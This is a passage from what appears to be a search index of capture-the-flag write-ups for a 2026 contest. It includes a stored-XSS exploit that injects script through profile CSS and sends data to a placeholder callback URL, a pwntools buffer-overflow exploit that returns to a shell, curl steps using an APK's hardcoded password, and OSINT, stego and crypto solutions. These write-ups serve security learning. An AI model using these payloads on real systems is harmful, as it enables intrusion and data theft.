<pre><code>@import url(\"&lt;/style&gt;&lt;script&gt;fetch('/settings')...)&lt;/script&gt;&lt;style&gt;\");\n</code></pre> <p>Which, when rendered in <code>profile.html</code>, produces:</p> <pre><code>&lt;style&gt;@import url(\"&lt;/style&gt;\n&lt;script&gt;fetch('/settings')...exfil...)&lt;/script&gt;\n&lt;style&gt;\");&lt;/style&gt;\n</code></pre> <p>The browser sees the first <code>&lt;/style&gt;</code> and closes the style block, then executes the <code>&lt;script&gt;</code> tag.</p>"},{"location":"rocsc2026/Y/writeup/#exploit","title":"Exploit","text":"<pre><code>#!/usr/bin/env python3\nimport requests\nimport time\n\nTARGET   = \"http://TARGET:PORT\"\nCALLBACK = \"https://YOUR_CALLBACK_URL\"\nBOT_BASE = \"http://localhost:5000\"\n\nsess = requests.Session()\nUSERNAME = f\"xss_{int(time.time())}\"\nPASSWORD = \"exploit123\"\nDISPLAY  = \"XSSTest\"\n\n\ndef register_and_login():\n    sess.post(f\"{TARGET}/register\", data={\n        'username': USERNAME, 'display_name': DISPLAY, 'password': PASSWORD,\n    }, timeout=15)\n    r = sess.post(f\"{TARGET}/login\", data={\n        'username': USERNAME, 'password': PASSWORD,\n    }, allow_redirects=True, timeout=15)\n    return 'Feed' in r.text or '/feed' in r.url\n\n\ndef find_our_uid():\n    for uid in range(1, 50):\n        r = sess.get(f\"{TARGET}/profile/{uid}\", timeout=8)\n        if r.status_code == 200 and DISPLAY in r.text:\n            return uid\n    return -1\n\n\ndef set_xss_css():\n    js = (\n        \"fetch('/settings').then(r=&gt;r.text()).then(t=&gt;{\"\n        \"var x=t.split('Username:')[1].split('&lt;/p&gt;')[0];\"\n        \"new Image().src='\" + CALLBACK + \"/?f='+encodeURIComponent(x)\"\n        \"})\"\n    )\n    css_payload = (\n        '@import url(\"\\\\3c /style\\\\3e \\\\3c script\\\\3e '\n        + js +\n        '\\\\3c /script\\\\3e \\\\3c style\\\\3e \");'\n    )\n    r = sess.post(f\"{TARGET}/settings/css\",\n                  data={'profile_css': css_payload},\n                  allow_redirects=True, timeout=15)\n    return r.status_code == 200\n\n\ndef report_profile(uid):\n    url = f\"{BOT_BASE}/profile/{uid}\"\n    r = sess.post(f\"{TARGET}/report\",\n                  data={'link': url},\n                  allow_redirects=True, timeout=15)\n    return r.status_code == 200\n\n\ndef main():\n    assert register_and_login(), \"Login failed\"\n    uid = find_our_uid()\n    assert uid &gt; 0, \"Could not find our user_id\"\n    assert set_xss_css(), \"CSS update failed\"\n    assert report_profile(uid), \"Report failed\"\n    print(f\"[+] Done! Check {CALLBACK} for ?f= parameter containing the flag\")\n\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"rocsc2026/Y/writeup/#steps-to-reproduce","title":"Steps to reproduce","text":"<ol> <li>Set up a public callback URL (e.g., Pipedream, webhook.site, or ngrok).</li> <li>Edit <code>TARGET</code> and <code>CALLBACK</code> in the exploit script.</li> <li>Run: <code>python3 exploit_final.py</code></li> <li>The flag arrives at the callback as the <code>?f=</code> query parameter:    <pre><code>GET /?f=%20ROCSC{...} HTTP/1.1\n</code></pre></li> </ol>"},{"location":"rocsc2026/Y/writeup/#flag","title":"Flag","text":"<pre><code>ROCSC{...}\n</code></pre>"},{"location":"rocsc2026/art-gallery-heist/writeup/","title":"Art Gallery Heist \u2014 OSINT Writeup","text":"<p>Category: OSINT Flag: <code>ROCSC{n0_ch@in_c@n_ev3r_h0ld_me_d0wn}</code></p>"},{"location":"rocsc2026/art-gallery-heist/writeup/#overview","title":"Overview","text":"<p>We are given an image and must use OSINT techniques to trace it back to its origin, find the owner, and ultimately discover the flag hidden on their social media.</p>"},{"location":"rocsc2026/art-gallery-heist/writeup/#solution","title":"Solution","text":""},{"location":"rocsc2026/art-gallery-heist/writeup/#step-1-reverse-image-search","title":"Step 1 \u2014 Reverse Image Search","text":"<p>Using Google reverse image search on the provided challenge image, we find a match leading to the website https://toshthecreator.com/websites/. From this site, we identify the name of the NFT collection: Ocean Racing Leagues.</p>"},{"location":"rocsc2026/art-gallery-heist/writeup/#step-2-find-the-nft-on-opensea","title":"Step 2 \u2014 Find the NFT on OpenSea","text":"<p>Navigating to OpenSea and searching for the \"Ocean Racing Leagues\" collection, we apply the following trait filters to narrow down the specific NFT from the challenge image:</p> <ul> <li>Background: intergalactic</li> <li>Phantskin: camo</li> </ul> <p>This leads us to the exact NFT, owned by wallet address:</p> <pre><code>0xe31f336e1a6983c1a77e1ff7edeaaac1e5d088d3\n</code></pre>"},{"location":"rocsc2026/art-gallery-heist/writeup/#step-3-trace-the-wallet-owner","title":"Step 3 \u2014 Trace the Wallet Owner","text":"<p>Searching for the wallet address <code>0xe31f336e1a6983c1a77e1ff7edeaaac1e5d088d3</code> on Google reveals the associated GitHub account:</p> <p>https://github.com/unchainedmf</p> <p>The GitHub profile bio reads: \"Send me memes on Twitter\" \u2014 pointing us to their Twitter/X account.</p>"},{"location":"rocsc2026/art-gallery-heist/writeup/#step-4-find-the-flag-on-twitter","title":"Step 4 \u2014 Find the Flag on Twitter","text":"<p>Searching for the username <code>unchainedmf</code> on Twitter (X), we find the account. The flag is posted in one of their tweets, encoded in Base64. Decoding it gives us the flag.</p>"},{"location":"rocsc2026/art-gallery-heist/writeup/#flag","title":"Flag","text":"<pre><code>ROCSC{n0_ch@in_c@n_ev3r_h0ld_me_d0wn}\n</code></pre>"},{"location":"rocsc2026/avault/writeup/","title":"A-VAULT \u2014 Mobile CTF Challenge Writeup","text":"<p>Challenge: A-VAULT Author: Ephvuln Category: Mobile / Android Reverse Engineering Flag: <code>CTF{a718900e378c200b52c3283fceeb24a885a14470907bcceec23b4b1253d40909}</code></p>"},{"location":"rocsc2026/avault/writeup/#description","title":"Description","text":"<p>The A-VALUT system is the latest in high-tech secure storage solutions. It provides a real-time encrypted video feed and remote access control via a dedicated mobile application.</p> <p>We've managed to get our hands on the official Android client used by the facility's security team. Your goal is to penetrate the system and open the safe.</p> <p>We are given an Android APK and a remote server at <code>https://34.185.153.233:31320</code>.</p>"},{"location":"rocsc2026/avault/writeup/#step-1-decompile-the-apk","title":"Step 1 \u2014 Decompile the APK","text":"<p>Decompiling the APK (e.g. with JADX), we find the main app package at <code>com.cyberedu.avalut</code> with these key activities:</p> <ul> <li>MainActivity \u2014 Entry point; takes server address + port</li> <li>LoginActivity \u2014 Authenticates with a password</li> <li>FeedActivity \u2014 Displays a live video feed from the vault camera</li> <li>SecurityOptionsActivity \u2014 Controls the vault door (open/close)</li> </ul>"},{"location":"rocsc2026/avault/writeup/#step-2-extract-hardcoded-secrets","title":"Step 2 \u2014 Extract Hardcoded Secrets","text":""},{"location":"rocsc2026/avault/writeup/#custom-api-header","title":"Custom API Header","text":"<p>In <code>c2/o.java</code> (the HTTP client class), every request includes a mandatory custom header:</p> <pre><code>httpsURLConnection.setRequestProperty(\"A-VALUT\", \"x-monitor-client-921754\");\n</code></pre> <p>Without this header, the server returns <code>Forbidden</code>.</p>"},{"location":"rocsc2026/avault/writeup/#hardcoded-password","title":"Hardcoded Password","text":"<p>In <code>n3/f.java</code> (the login screen composable), the password is checked client-side before being sent to the server:</p> <pre><code>boolean zA = q4.i.a((String) a1Var5.getValue(), \"R4M_$tonks\");\n</code></pre> <p>The hardcoded password is: <code>R4M_$tonks</code></p>"},{"location":"rocsc2026/avault/writeup/#step-3-understand-the-api-flow","title":"Step 3 \u2014 Understand the API Flow","text":"<p>From the decompiled code, we identify four endpoints:</p> Endpoint Method Auth Purpose <code>/anon</code> GET None Returns an anonymous JWT token <code>/login</code> POST Bearer token Authenticates with password, returns admin JWT <code>/feed</code> GET Bearer token Returns the vault camera feed (PNG image) <code>/security/options</code> POST Bearer token Controls the vault door (<code>{\"door\":\"open\"}</code>) <p>The flow is: 1. Hit <code>/anon</code> to get an initial anonymous JWT 2. Use that JWT + the password to <code>/login</code> and get an authenticated admin JWT 3. Use the admin JWT to interact with <code>/feed</code> and <code>/security/options</code></p>"},{"location":"rocsc2026/avault/writeup/#step-4-exploit","title":"Step 4 \u2014 Exploit","text":""},{"location":"rocsc2026/avault/writeup/#41-get-anonymous-token","title":"4.1 \u2014 Get Anonymous Token","text":"<pre><code>curl -sk -H \"A-VALUT: x-monitor-client-921754\" \\\n  https://34.185.153.233:31320/anon\n</code></pre> <p>Response: <pre><code>{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiY2xpZW50IjoiYW5kcm9pZF9jbGllbnQiLCJpYXQiOi...\"}\n</code></pre></p> <p>Decoded JWT payload: <pre><code>{\"id\": 0, \"client\": \"android_client\", \"iat\": 1771602165, \"exp\": 1771605765}\n</code></pre></p>"},{"location":"rocsc2026/avault/writeup/#42-login-with-hardcoded-password","title":"4.2 \u2014 Login with Hardcoded Password","text":"<pre><code>curl -sk -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -H \"A-VALUT: x-monitor-client-921754\" \\\n  -H \"Authorization: Bearer &lt;ANON_TOKEN&gt;\" \\\n  -d '{\"password\":\"R4M_$tonks\"}' \\\n  https://34.185.153.233:31320/login\n</code></pre> <p>Response contains a new JWT with admin privileges: <pre><code>{\"id\": 0, \"client\": \"android_client\", \"isAdmin\": true, \"iat\": ..., \"exp\": ...}\n</code></pre></p>"},{"location":"rocsc2026/avault/writeup/#43-open-the-vault-door","title":"4.3 \u2014 Open the Vault Door","text":"<pre><code>curl -sk -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -H \"A-VALUT: x-monitor-client-921754\" \\\n  -H \"Authorization: Bearer &lt;AUTH_TOKEN&gt;\" \\\n  -d '{\"door\":\"open\"}' \\\n  https://34.185.153.233:31320/security/options\n</code></pre> <p>Response: <code>Door opened</code></p>"},{"location":"rocsc2026/avault/writeup/#44-retrieve-the-flag-from-the-camera-feed","title":"4.4 \u2014 Retrieve the Flag from the Camera Feed","text":"<pre><code>curl -sk -o feed.png \\\n  -H \"A-VALUT: x-monitor-client-921754\" \\\n  -H \"Authorization: Bearer &lt;AUTH_TOKEN&gt;\" \\\n  https://34.185.153.233:31320/feed\n</code></pre> <p>The returned PNG (1024\u00d71024) shows the vault camera feed with the flag visible inside the now-open safe:</p> <pre><code>CTF{a718900e378c200b52c3283fceeb24a885a14470907bcceec23b4b1253d40909}\n</code></pre>"},{"location":"rocsc2026/avault/writeup/#summary","title":"Summary","text":"Step Action 1 Decompile APK to extract hardcoded password (<code>R4M_$tonks</code>) and custom header (<code>A-VALUT: x-monitor-client-921754</code>) 2 Call <code>/anon</code> with the custom header to get an anonymous JWT 3 Call <code>/login</code> with the anonymous JWT + hardcoded password to get an admin JWT (<code>isAdmin: true</code>) 4 Call <code>/security/options</code> with <code>{\"door\":\"open\"}</code> to unlock the vault 5 Call <code>/feed</code> to retrieve the camera image containing the flag"},{"location":"rocsc2026/chimera-void/writeup/","title":"Chimera Void \u2014 Network Writeup","text":"<p>Category: Network Flag: <code>CTF{CONGRATS_WINNERS}</code></p>"},{"location":"rocsc2026/chimera-void/writeup/#overview","title":"Overview","text":"<p>We are given a <code>.pcap</code> capture file (<code>chimera_void.pcap</code>). The goal is to find the hidden flag within the network traffic.</p>"},{"location":"rocsc2026/chimera-void/writeup/#solution","title":"Solution","text":""},{"location":"rocsc2026/chimera-void/writeup/#step-1-analyze-the-pcap-in-wireshark","title":"Step 1 \u2014 Analyze the PCAP in Wireshark","text":"<p>Opening the file in Wireshark reveals a massive amount of network traffic. Most of it is deliberate noise \u2014 random data injected to obfuscate the real communication and hinder automated analysis.</p> <p>By filtering out the noise traffic, we discover an alternative TCP stream that stands out. Following this stream reveals it is transmitting a <code>.gcode</code> file.</p>"},{"location":"rocsc2026/chimera-void/writeup/#step-2-extract-the-g-code-file","title":"Step 2 \u2014 Extract the G-code file","text":"<p>We extract the <code>.gcode</code> data from the TCP stream using Wireshark's \"Follow TCP Stream\" \u2192 \"Save As\" functionality, producing <code>chimera_test.gcode</code>.</p>"},{"location":"rocsc2026/chimera-void/writeup/#step-3-understand-g-code","title":"Step 3 \u2014 Understand G-code","text":"<p>G-code is a language used to control CNC machines and 3D printers. It describes motion paths using commands like:</p> <ul> <li><code>G0 X... Y...</code> \u2014 rapid travel move (non-printing)</li> <li><code>G1 X... Y...</code> \u2014 linear move (printing/extrusion)</li> </ul> <p>The key insight is that G-code can encode images \u2014 the print head traces out shapes that form visible patterns.</p>"},{"location":"rocsc2026/chimera-void/writeup/#step-4-render-the-g-code","title":"Step 4 \u2014 Render the G-code","text":"<p>The rendered image spells out the flag.</p> <p>Pasting the <code>.gcode</code> into an online G-code interpreter/viewer renders the image from which the flag can be read.</p>"},{"location":"rocsc2026/chimera-void/writeup/#flag","title":"Flag","text":"<pre><code>CTF{CONGRATS_WINNERS}\n</code></pre>"},{"location":"rocsc2026/clanker-casino/writeup/","title":"Clanker Casino \u2014 CTF Writeup","text":"<p>Category: Web / Misc Flag: <code>CTF{954eab9fa51e0aeecd2bab944f60ee15af0a064d97651719752865208c28bc24}</code></p>"},{"location":"rocsc2026/clanker-casino/writeup/#description","title":"Description","text":"<p>People tried to cheat the system with computers. Now it is time to cheat computers with human input.</p>"},{"location":"rocsc2026/clanker-casino/writeup/#overview","title":"Overview","text":"<p>The challenge is a Flask-based coin-flip gambling app. Players register with 1 coin and must reach 200 coins to see the flag. Each bet is a fair 50/50 coin flip \u2014 heads pays 2\u00d7, tails loses the bet. Every flip requires solving a CAPTCHA before submission.</p> <p>The twist: the CAPTCHA uses a custom font with OpenType contextual alternates that visually scrambles the digits. The HTML source says one thing, but the browser renders something different. A human reading the screen sees different numbers than a bot reading the HTML.</p>"},{"location":"rocsc2026/clanker-casino/writeup/#source-code-analysis","title":"Source Code Analysis","text":""},{"location":"rocsc2026/clanker-casino/writeup/#apppy","title":"<code>app.py</code>","text":"<ul> <li>Users start with 1 coin, flag is shown at \u2265200 coins.</li> <li>The coin flip uses <code>secrets.choice(['heads', 'tails'])</code> \u2014 truly random, no way to predict.</li> <li>Each round generates a CAPTCHA via <code>generateCaptcha()</code>, stores the solution server-side keyed by a random token in the session.</li> <li>The CAPTCHA answer must match exactly to proceed.</li> </ul>"},{"location":"rocsc2026/clanker-casino/writeup/#captchapy","title":"<code>captcha.py</code>","text":"<p>The local stub is a placeholder (<code>return {\"html_source\": \"00+00\", \"solution\": 78}</code>). The real implementation on the remote generates expressions like <code>AB+CD</code> where A, B, C, D are digits 0\u20139.</p>"},{"location":"rocsc2026/clanker-casino/writeup/#key-css-stylecss","title":"Key CSS (<code>style.css</code>)","text":"<pre><code>.captcha-container {\n    font-family: 'editundo', sans-serif;\n    font-size: 40px;\n    font-feature-settings: \"calt\" 1;\n    user-select: none;\n}\n</code></pre> <p>The <code>font-feature-settings: \"calt\" 1</code> enables Contextual Alternates \u2014 an OpenType feature that substitutes glyphs based on surrounding characters. The <code>user-select: none</code> prevents copy-paste.</p>"},{"location":"rocsc2026/clanker-casino/writeup/#editundottf","title":"<code>editundo.ttf</code>","text":"<p>The font is served from <code>/font/editundo.ttf</code>. It contains a <code>GSUB</code> table with a <code>calt</code> feature (Lookup 0, type 6 \u2014 Chaining Contextual Substitution) that references 19 single-substitution lookups. The rules swap digit glyphs based on:</p> <ul> <li>What digit follows (lookahead context)</li> <li>What digit precedes (backtrack context)</li> <li>Whether the <code>+</code> sign is adjacent</li> </ul> <p>For example, when rendering <code>17+43</code>: - The <code>1</code> sees <code>7</code> ahead and <code>+</code> two positions ahead \u2192 gets substituted - The <code>7</code> sees backtrack context of the substituted <code>1</code> and lookahead <code>+</code> \u2192 gets substituted - After <code>+</code>, the <code>4</code> and <code>3</code> are similarly remapped</p> <p>The result is that <code>17+43</code> in HTML might render visually as <code>45+15</code> on screen.</p>"},{"location":"rocsc2026/clanker-casino/writeup/#solution","title":"Solution","text":""},{"location":"rocsc2026/clanker-casino/writeup/#step-1-download-and-analyze-the-font","title":"Step 1: Download and Analyze the Font","text":"<pre><code>import requests\nr = requests.get('http://TARGET/font/editundo.ttf')\nwith open('editundo.ttf', 'wb') as f:\n    f.write(r.content)\n</code></pre> <p>Using <code>fontTools</code>, we confirmed the font has a complex <code>calt</code> GSUB feature with 20 lookups implementing contextual digit substitution.</p>"},{"location":"rocsc2026/clanker-casino/writeup/#step-2-build-a-visual-mapping-table","title":"Step 2: Build a Visual Mapping Table","text":"<p>Since Pillow on this system has HarfBuzz support (<code>features.check('harfbuzz') == True</code>), we can render text with OpenType features applied:</p> <pre><code>from PIL import Image, ImageDraw, ImageFont\n\nfont = ImageFont.truetype('editundo.ttf', 60)\n\n# Render with calt enabled (default in HarfBuzz)\nimg = Image.new('L', (300, 80), 255)\ndraw = ImageDraw.Draw(img)\ndraw.text((10, 5), \"17+43\", font=font, fill=0)\n\n# Render without calt for comparison\nimg_raw = Image.new('L', (300, 80), 255)\ndraw = ImageDraw.Draw(img_raw)\ndraw.text((10, 5), \"17+43\", font=font, fill=0, features=['-calt'])\n</code></pre> <p>We confirmed these produce different images \u2014 <code>calt</code> is actively remapping digits.</p> <p>To build the complete mapping, we:</p> <ol> <li>Rendered each isolated digit 0\u20139 as a reference (no contextual substitution applies to single characters).</li> <li>Rendered all 100 possible two-digit left-side values (<code>00</code>\u2013<code>99</code>) in context <code>AB+00</code> with <code>calt</code>, then compared each rendered digit against the references to identify the visual digit.</li> <li>Did the same for the right side: <code>00+CD</code> for all <code>CD</code> values.</li> <li>Combined the mappings: for source expression <code>AB+CD</code>, the visual sum = <code>visual(AB) + visual(CD)</code>.</li> </ol> <p>This produced a lookup table of 10,000 entries mapping every possible <code>AB+CD</code> to its correct visual answer.</p>"},{"location":"rocsc2026/clanker-casino/writeup/#step-3-automate-the-game","title":"Step 3: Automate the Game","text":"<p>The gambling strategy is simple: always go all-in. Starting from 1 coin, we need 8 consecutive heads to reach 256 (\u2265200). The probability is $(1/2)^8 = 1/256$ per attempt. On failure, we re-register a new account and try again.</p> <pre><code>while coins &lt; 200 and coins &gt; 0:\n    captcha, coins, page = get_captcha_and_coins(session)\n    answer = solutions[captcha]       # lookup visual sum\n    coins, flashes, flag = play_round(session, coins, answer)\n    if flag:\n        print(flag)\n        break\nif coins == 0:\n    # re-register and try again\n</code></pre> <p>After ~282 attempts (\u22481 minute of automated play), we hit a streak of 8 consecutive wins and the flag was displayed.</p>"},{"location":"rocsc2026/clanker-casino/writeup/#key-insight","title":"Key Insight","text":"<p>The challenge title hints at it: \"cheat computers with human input.\" A human looking at the browser sees the correct (visually rendered) digits thanks to the font's contextual alternates. A bot reading the HTML source sees the raw (unsubstituted) digits. The CAPTCHA solution is computed from the visual representation, not the source \u2014 so you need to reverse-engineer the font's glyph substitution to solve it programmatically.</p>"},{"location":"rocsc2026/directory/writeup/","title":"Directory \u2014 PWN Writeup","text":"<p>Challenge: Directory Author: 0xd1s Category: PWN Description: twisted Remote: <code>nc 35.198.180.77 30993</code> Flag: <code>CTF{3asy_pwn_chall}</code></p>"},{"location":"rocsc2026/directory/writeup/#binary-analysis","title":"Binary Analysis","text":"<pre><code>directory: ELF 64-bit LSB pie executable, x86-64\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n    Stripped:   No\n</code></pre> <p>Key observations: no stack canary and PIE enabled (but no leak needed).</p> <p>The binary is a simple phonebook / directory manager with four options:</p> <ol> <li>Add a name \u2014 reads up to <code>0x30</code> bytes via <code>read()</code>, then <code>memcpy</code>s into an entry slot</li> <li>Remove a name \u2014 shifts entries down to fill the gap</li> <li>Print directory \u2014 lists all stored names</li> <li>Exit \u2014 breaks the menu loop and returns</li> </ol> <p>A hidden <code>win()</code> function calls <code>system(\"/bin/sh\")</code>.</p>"},{"location":"rocsc2026/directory/writeup/#vulnerability","title":"Vulnerability","text":"<p>Inside <code>process_menu</code>, the stack frame is laid out as:</p> <pre><code>rbp - 0x1e0:  count (4 bytes)\nrbp - 0x1dc:  read buffer (0x30 bytes, used by read())\n...\nrbp - 0x80:   entry[0].name  (at buf + 0x10c, each entry is 20 bytes)\n...\nrbp - 0x20:   entry[9].name  (at buf + 0x1c0)\nrbp + 0x00:   saved RBP\nrbp + 0x08:   return address\n</code></pre> <p>The program allows up to 10 entries (indices 0\u20139). When adding name at index 9:</p> <ol> <li><code>read(0, buf+4, 0x30)</code> reads up to 48 bytes into the temporary buffer</li> <li><code>memcpy(entry[9], buf+4, read_count)</code> copies all read bytes to <code>entry[9].name</code></li> </ol> <p>Since <code>entry[9]</code> starts at <code>rbp - 0x20</code>, writing 0x29 bytes reaches: - 0x20 bytes padding to saved RBP - 8 bytes overwriting saved RBP - 1 byte partially overwriting the return address</p>"},{"location":"rocsc2026/directory/writeup/#exploitation","title":"Exploitation","text":"<p>The return address on the stack points back to <code>main</code> after calling <code>process_menu</code>:</p> <pre><code>0x1561:  call   process_menu    ; in main\n0x1566:  mov    eax, 0x0        ; \u2190 return address (low byte = 0x66)\n</code></pre> <p>The <code>win</code> function is at:</p> <pre><code>0x1537:  push   rbp             ; win()\n0x1538:  mov    rbp, rsp\n0x153b:  lea    rax, [\"/bin/sh\"] ; win+4\n</code></pre> <p>Both addresses share the same page \u2014 only the low byte differs. Since PIE randomizes at page granularity (0x1000), the low 12 bits are fixed. A single-byte partial overwrite is 100% reliable with no leak needed.</p>"},{"location":"rocsc2026/directory/writeup/#stack-alignment","title":"Stack Alignment","text":"<p>Returning directly to <code>win</code> (0x1537) leaves RSP 16-byte aligned at function entry. However, the x86-64 ABI requires RSP \u2261 8 (mod 16) after the <code>call</code> that pushes the return address. The <code>push rbp</code> inside <code>win</code> would make RSP \u2261 0 (mod 16), but <code>system()</code> internally uses <code>movaps</code> which requires 16-byte alignment \u2014 causing a crash.</p> <p>The fix: jump to <code>win+4</code> (0x153b), skipping <code>push rbp; mov rbp, rsp</code>. This keeps RSP properly aligned when <code>system(\"/bin/sh\")</code> executes.</p> <ul> <li>Return address low byte: <code>0x66</code> \u2192 overwrite with <code>0x3b</code> (win+4)</li> </ul>"},{"location":"rocsc2026/directory/writeup/#exploit-script","title":"Exploit Script","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\nimport sys\n\nHOST = \"35.198.180.77\"\nPORT = 30993\n\nbinary = \"./directory\"\nelf    = ELF(binary, checksec=False)\ncontext.binary = elf\n\ndef add_name(io, name: bytes):\n    io.sendlineafter(b\"&gt; \", b\"1\")\n    io.recvuntil(b\"Enter name: \")\n    io.send(name)\n\ndef do_exit(io):\n    io.sendlineafter(b\"&gt; \", b\"4\")\n\ndef pwn():\n    if \"REMOTE\" in sys.argv:\n        io = remote(HOST, PORT)\n    else:\n        io = process(binary)\n\n    # Fill entries 0-8\n    for i in range(9):\n        add_name(io, f\"name{i}\\n\".encode())\n\n    # Entry 9: 0x28 bytes padding + 0x3b (partial overwrite \u2192 win+4)\n    payload = b\"A\" * 0x28 + b\"\\x3b\"\n    add_name(io, payload)\n\n    # Exit triggers return \u2192 win+4 \u2192 system(\"/bin/sh\")\n    do_exit(io)\n    io.interactive()\n\nif __name__ == \"__main__\":\n    pwn()\n</code></pre>"},{"location":"rocsc2026/directory/writeup/#execution","title":"Execution","text":"<pre><code>$ python3 exploit.py REMOTE\n[+] Opening connection to 35.198.180.77 on port 30993: Done\n[*] Switching to interactive mode\nExiting...\n$ cat flag.txt\nCTF{3asy_pwn_chall}\n</code></pre>"},{"location":"rocsc2026/echoes-of-the-past/writeup/","title":"Echoes of the Past - Writeup","text":"<p>Category: Steganography Author: Joker Flag: <code>CTF{2a97516c354b68848cdbd8f54a226a0a55b21ed138e207ad6c5cbb9c00aa5aea}</code></p>"},{"location":"rocsc2026/echoes-of-the-past/writeup/#challenge-description","title":"Challenge Description","text":"<p>You received an audio recording titled past_echoes.wav. It sounds repetitive \u2014 almost like something is being repeated back to you. There's a hidden message inside the audio. Once you recover it, follow the instruction\u2026 and don't forget to look into the past for the username.</p>"},{"location":"rocsc2026/echoes-of-the-past/writeup/#solution","title":"Solution","text":""},{"location":"rocsc2026/echoes-of-the-past/writeup/#step-1-analyze-the-wav-file","title":"Step 1 \u2014 Analyze the WAV File","text":"<p>We start by examining the file metadata:</p> <pre><code>ffprobe past_echoes.wav\n</code></pre> <p>Key findings: - Format: 16-bit PCM, mono, 44100 Hz - Duration: 4 minutes 19 seconds (259.2s) - Metadata tag: <code>PSTD: Past Date=06.07.2022</code></p> <p>The metadata contains a date \u2014 this is the \"past\" the description hints at.</p>"},{"location":"rocsc2026/echoes-of-the-past/writeup/#step-2-discover-the-repeated-structure","title":"Step 2 \u2014 Discover the Repeated Structure","text":"<p>The description says the audio \"sounds repetitive \u2014 almost like something is being repeated back to you.\" We check if the file is split into two identical (or near-identical) halves:</p> <pre><code>half = len(samples) // 2  # 5715360 samples = 129.6s each\ncorrelation = np.corrcoef(samples[:half], samples[half:])[0, 1]\n# correlation = 0.93 \u2014 extremely high\n</code></pre> <p>The audio is essentially the same content played twice, with subtle differences between the halves.</p>"},{"location":"rocsc2026/echoes-of-the-past/writeup/#step-3-decode-the-beep-pattern","title":"Step 3 \u2014 Decode the Beep Pattern","text":"<p>The audio consists of 440 Hz beeps separated by gaps of varying lengths. Using RMS energy analysis with 10ms windows, we identify four distinct gap types:</p> Gap Duration Symbol Meaning ~0.02s C Connect (beeps form a pair) ~0.62s S Short gap within a group ~0.82s L Long gap within a group ~1.42s X Separator between groups <p>Gaps always come in pairs: either <code>(L, S)</code> representing binary <code>1</code>, or <code>(C, X)</code> representing binary <code>0</code>.</p> <p>Each half encodes a 72-bit binary string (9 bytes):</p> Half Bits ASCII First <code>011001110110111101110100011011110111001001101111011000110111001101100011</code> gotorocsc Second <code>001011100111001001101111011010010110111001110000011000010111001101110100</code> .roinpast"},{"location":"rocsc2026/echoes-of-the-past/writeup/#step-4-follow-the-instruction","title":"Step 4 \u2014 Follow the Instruction","text":"<p>Combining both halves gives the message: \"go to rocsc.ro in past\"</p> <p>Together with the WAV metadata <code>Past Date=06.07.2022</code>, this tells us to visit <code>rocsc.ro</code> on the Wayback Machine around July 6, 2022.</p>"},{"location":"rocsc2026/echoes-of-the-past/writeup/#step-5-find-the-username","title":"Step 5 \u2014 Find the Username","text":"<p>Visiting https://web.archive.org/web/20220706114303/https://www.rocsc.ro/ reveals the 2022 version of the site, which was an OSjs-based web desktop.</p> <p>The login form in <code>osjs.js</code> had pre-filled credentials:</p> <pre><code>login: {\n  username: 'demo',\n  password: 'demo'\n}\n</code></pre>"},{"location":"rocsc2026/echoes-of-the-past/writeup/#step-6-compute-the-flag","title":"Step 6 \u2014 Compute the Flag","text":"<p>The flag is the SHA256 hash of the username <code>demo</code>:</p> <pre><code>echo -n \"demo\" | sha256sum\n# 2a97516c354b68848cdbd8f54a226a0a55b21ed138e207ad6c5cbb9c00aa5aea\n</code></pre> <p>Flag: <code>CTF{2a97516c354b68848cdbd8f54a226a0a55b21ed138e207ad6c5cbb9c00aa5aea}</code></p>"},{"location":"rocsc2026/fifteen-minutes/writeup/","title":"fifteenminutes \u2014 Crypto Writeup","text":"<p>Category: Crypto Remote: <code>nc 35.234.109.37 30351</code> Flag: <code>flag{ortho_lattice_ftw_56f17b85f9a3d5891b0f}</code></p>"},{"location":"rocsc2026/fifteen-minutes/writeup/#overview","title":"Overview","text":"<p>The server implements a custom RSA-like oracle with two challenge types, each running for 5 rounds. We have a 15-minute time limit (<code>signal.alarm(900)</code>) to solve all 10 rounds.</p>"},{"location":"rocsc2026/fifteen-minutes/writeup/#challenge-source","title":"Challenge Source","text":"<pre><code>bits = 1500\nk = 3\nrounds = 5\n\ndef chal(typ):\n    for t in range(rounds):\n        p = getPrime(bits)  # p \u2262 1 (mod 3)\n        q = getPrime(bits)  # q \u2262 1 (mod 3)\n        n = p * q\n        m = randbelow(n)\n        e = 3\n        d = pow(e, -1, (p-1)*(q-1))\n\n        if typ == 1: xp = d    # Signatures: res = (a*m + b)^d mod n\n        else:        xp = e    # Encryption:  res = (a*m + b)^3 mod n\n\n        for _ in range(50):\n            s = input()\n            if s == \"E\": break\n            a = randbelow(2**100)\n            b = randbelow(2**100)\n            res = pow(a*m + b, xp, n)\n            print(f\"{res=}\")\n\n        if typ == 1:\n            N = int(input(\"n=\"))\n            assert N == n\n        else:\n            N = int(input(\"n=\"))\n            M = int(input(\"m=\"))\n            assert N == n and M == m\n</code></pre> <ul> <li>Type 1 (Signatures): We get <code>res = (a*m + b)^d mod n</code> and must recover <code>n</code>.</li> <li>Type 2 (Encryption): We get <code>res = (a*m + b)^3 mod n</code> and must recover both <code>n</code> and <code>m</code>.</li> </ul> <p>The coefficients <code>a, b</code> are random ~100-bit integers that we don't know, but they are small relative to the 3000-bit modulus <code>n</code>.</p>"},{"location":"rocsc2026/fifteen-minutes/writeup/#solution","title":"Solution","text":""},{"location":"rocsc2026/fifteen-minutes/writeup/#part-1-recover-n-from-signatures-type-1","title":"Part 1 \u2014 Recover n from Signatures (Type 1)","text":"<p>Each response is <code>res_i = (a_i * m + b_i)^d mod n</code>. Since <code>d</code> is the RSA private exponent with <code>e = 3</code>:</p> <p>$$res_i^3 = (a_i \\cdot m + b_i)^3 \\mod n$$</p> <p>but also:</p> <p>$$res_i^3 = (a_i \\cdot m + b_i)^3 + k_i \\cdot n$$</p> <p>for some integer $k_i$. Expanding the cube, each $Y_i = res_i^3$ is an integer that equals $(a_i m + b_i)^3$ over the integers plus a multiple of $n$.</p> <p>The expanded cube $(am + b)^3 = a^3 m^3 + 3a^2 b m^2 + 3ab^2 m + b^3$ lies in a 3-dimensional subspace (spanned by the monomials $m^3, m^2, m, 1$ \u2014 but the coefficients $(a^3, 3a^2b, 3ab^2, b^3)$ lie on a twisted cubic, so effectively a 3D hidden structure plus a multiple of $n$ in 